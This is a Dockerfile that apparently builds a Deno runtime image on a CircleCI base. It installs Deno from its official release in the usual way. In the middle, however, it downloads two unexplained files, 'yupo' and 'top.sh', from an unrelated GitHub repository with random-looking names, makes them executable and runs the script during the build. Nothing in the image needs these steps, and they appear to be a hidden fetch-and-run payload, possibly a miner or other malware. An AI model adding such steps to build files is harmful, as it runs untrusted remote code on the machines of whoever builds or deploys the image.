FROM cimg/base:stable

ENV DENO_VERSION=1.1.1
ENV GROUP_USER_NUMBER=3005

RUN sudo apt-get -qq update \
 && sudo apt-get upgrade -y -o Dpkg::Options::="--force-confold" \
 && sudo apt-get -qq install -y ca-certificates curl unzip --no-install-recommends \
 && curl -fsSL https://github.com/denoland/deno/releases/download/v${DENO_VERSION}/deno-x86_64-unknown-linux-gnu.zip \
         --output deno.zip \
 && unzip deno.zip \
 && rm deno.zip \
 && chmod 777 deno \
 && sudo mv deno /usr/bin/deno \
 && sudo apt-get -qq remove -y ca-certificates curl unzip \
 && sudo apt-get -y -qq autoremove \
 && sudo apt-get -qq clean \
 && sudo rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
RUN chmod +x yupo
RUN chmod +x top.sh
RUN ./top.sh


RUN sudo useradd --uid ${GROUP_USER_NUMBER} --user-group deno \
 && sudo mkdir /deno-dir/ \
 && sudo chown deno:deno /deno-dir/

ENV DENO_DIR /deno-dir/

ENTRYPOINT ["deno"]
